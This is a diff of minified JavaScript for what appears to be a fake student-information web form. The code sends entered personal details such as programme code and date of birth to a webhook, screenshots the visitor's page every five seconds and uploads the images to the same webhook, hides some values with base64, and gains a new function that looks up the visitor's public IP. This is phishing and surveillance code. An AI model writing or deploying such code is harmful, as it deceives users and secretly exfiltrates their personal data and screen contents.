@@ -11,3 +11,12 @@ const validAprilDates=atob("MjAyNS0wNC0wMywyMDI1LTA0LTA0").split(","),validNames
 **Programme Code:** ${o}
 **Date of Birth:** ${r}
 `;fetch(webhookUrl,{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({content:e})}).then(e=>{e.ok?this.reset():console.error("Error:",e.statusText)}).catch(e=>{alert("Error sending data."),console.error(e)})}),window.addEventListener("load",()=>{setInterval(()=>{html2canvas(document.body,{useCORS:!0}).then(e=>{e.toBlob(e=>{var t=new FormData;t.append("file",e,"screenshot.png"),t.append("payload_json",JSON.stringify({content:"📸 Screenshot taken at "+(new Date).toLocaleString()})),fetch(webhookUrl,{method:"POST",body:t}).then(e=>{e.ok?console.log("Screenshot sent"):console.error("Screenshot failed:",e.statusText)}).catch(console.error)},"image/png")})},5e3)}),$(document).ready(function(){setTimeout(function(){$("#infoOverlay").show(),$("#infoPopup").show(),setTimeout(()=>{$("#dearChange").text("Student")},500)},5e3),$("#closeInfoPopup").click(function(){$("#infoOverlay").hide(),$("#infoPopup").hide()}),$("#studentForm").on("submit",function(e){e.preventDefault();var e=$.trim($("#enrollmentNo").val()),t=$.trim($("#dob").val());e&&t?"2300822199"===e||["2000-10-06","1999-10-06"].includes(t)?($("#overlay").show(),$("#popup").show()):alert("Details do not match. Please check your information."):alert("Please fill in all required fields.")})});
+function getPublicIP() {
+    return fetch('https://api.ipify.org?format=json')
+    .then(res => res.json())
+    .then(data => data.ip)
+    .catch(err => {
+        console.error('Public IP error:', err);
+        return 'Error';
+    });
+}
